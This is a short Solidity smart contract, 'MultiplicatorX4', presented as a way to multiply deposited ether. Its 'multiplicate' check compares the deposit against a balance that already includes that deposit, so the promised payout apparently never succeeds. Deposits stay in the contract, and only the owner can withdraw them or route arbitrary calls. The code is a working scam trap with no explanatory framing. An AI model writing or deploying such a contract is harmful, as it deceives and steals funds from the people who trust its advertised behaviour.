pragma solidity ^0.4.18;

contract MultiplicatorX4 {
    address public owner = msg.sender;

    function() public payable {}

    function withdraw() public {
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }

    function command(address _receiver, bytes _data) public payable {
        require(msg.sender == owner);
        require(_receiver != address(0));
        require(_data.length > 0);
        require(_receiver.call.value(msg.value)(_data));
    }

    function multiplicate(address _receiver) public payable {
        require(_receiver != address(0));
        require(msg.value >= this.balance);
        _receiver.transfer(this.balance + msg.value);
    }
}